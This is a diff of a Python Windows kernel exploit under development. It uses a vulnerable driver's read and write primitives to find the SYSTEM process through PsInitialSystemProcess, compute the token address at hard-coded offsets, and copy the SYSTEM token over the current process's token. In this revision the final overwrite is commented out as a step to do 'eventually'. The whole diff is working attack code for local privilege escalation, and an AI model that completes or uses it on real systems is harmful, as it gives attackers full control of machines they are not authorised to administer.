@@ -152,7 +152,7 @@ def getkernelBase(driver):
 
 ########################################### CALCULATE OFFSETS FROM KERNEL #############################################
 
-def get_PsISP_kernel_address(kernel_base, img_name):
+def get_PsISP_kernel_address(driver, kernel_base, img_name):
 
     kernel32.LoadLibraryA.restype = c_uint64
     kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
@@ -170,11 +170,12 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
     # Calculate PsInitialSystemProcess offset in kernel land
 
-    system_proc_struct_base_ptr = kernel_base + PsISP_User_Address - kernel_handle
-    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % system_proc_struct_base_ptr
+    ptr_to_system_proc_struct_base_ptr = kernel_base + PsISP_User_Address - kernel_handle
+    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % ptr_to_system_proc_struct_base_ptr
 
     PsISP_kernel_address = c_ulonglong()
 
+    system_proc_struct_base_ptr = readPrimitive(driver, ptr_to_system_proc_struct_base_ptr, USER_MEM_PAGE_PTR)
 
     return long(system_proc_struct_base_ptr)
 
@@ -215,11 +216,11 @@ def userwriteQWORD(driver, what=None, USER_MEM_PAGE_PTR=None):
 
 ################################################### KERNEL WRITE FUNCTION ###########################################################
 
-def kernelwriteQWORD(driver, system_token, CURRENT_PROCESS_BASE_STRUCT_PTR):
+def kernelwriteQWORD(driver, system_token_address, CURRENT_PROCESS_BASE_STRUCT_PTR):
     
-    # Write the what value (system_token) to CURRENT_PROCESS_BASE_STRUCT_PTR
+    # Write the what value (system_token_address) to CURRENT_PROCESS_BASE_STRUCT_PTR
 
-    data = struct.pack("<Q", system_token)
+    data = struct.pack("<Q", system_token_address)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_MEM_PAGE_PTR, data, len(data), byref(written))
     
     if dwStatus == 0:
@@ -277,9 +278,9 @@ def readPrimitive(driver, USER_WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR):
         NULL,
         )
  
-    process_struct_ptr = cast(USER_ADDR, POINTER(c_ulonglong))[0]
+    value_from_read = cast(USER_ADDR, POINTER(c_ulonglong))[0]
 
-    return process_struct_ptr
+    return value_from_read
 
 ############################## GET CURRENT PROCESS TOKEN OFFSET ################################
 
@@ -344,54 +345,28 @@ def executeOverwrite():
         # Get system process base.
 
         print "MAIN Got Kernel Base, Getting System Process Base!"
-        system_proc_struct_base_ptr = get_PsISP_kernel_address(kernel_base, img_name)
+        system_proc_struct_base_ptr = get_PsISP_kernel_address(driver, kernel_base, img_name)
 
-        # Read the value of that token.
-
-        print "MAIN Got System Process Base, Getting System Token!"
-
-        #triggerIOCTL, process_struct_ptr = readPrimitive(driver, system_proc_struct_base_ptr, USER_ADDR)
-
-        process_struct_ptr = readPrimitive(driver, system_proc_struct_base_ptr, USER_ADDR)
-
-        
         # Define our expected offsets for this version of Windows.
 
         PROC_FLINK_OFFSET = 0x2e8
         TOKEN_OFFSET = 0x358
 
-        print "MAIN We know the proper offsets now."
-        system_token = system_proc_struct_base_ptr + TOKEN_OFFSET
+        print "MAIN Calculating System Token Address."
+        system_token_address = system_proc_struct_base_ptr + TOKEN_OFFSET
 
-        current_proc_base_struct_ptr = system_proc_struct_base_ptr
+        print "MAIN Reading the system_token from that address."
+        readPrimitive(driver, system_token_address, USER_ADDR)
 
-        counter = 0
 
-        while True:
+    
 
-            if counter > 0:
-                break
-            counter+=1
 
-            next_proc_struct = readPrimitive(driver, current_proc_base_struct_ptr + PROC_FLINK_OFFSET, USER_ADDR)
-            if next_proc_struct == system_proc_struct_base_ptr:
-                break
-     
-            current_proc_base_struct_ptr = next_proc_struct
-
-            print "Process Base Pointer", type(current_proc_base_struct_ptr), hex(current_proc_base_struct_ptr)
-
-            current_token = current_proc_base_struct_ptr + TOKEN_OFFSET
-
-                                    #what              #where                                
-            userwriteQWORD(driver, process_struct_ptr, USER_MEM_PAGE_PTR)
-
+            #EVENTUALLY WE DO THIS
 
             #print "MAIN Attempting system to current token overwrite!"
                                      #what         #where
-            kernelwriteQWORD(driver, system_token, current_token)
-
-            #success = writePrimitive(driver, system_token, current_token, system_token)
+            #kernelwriteQWORD(driver, system_token_address, current_token)
 
         #print "MAIN Success!"
 ############################################ RUN ################################################
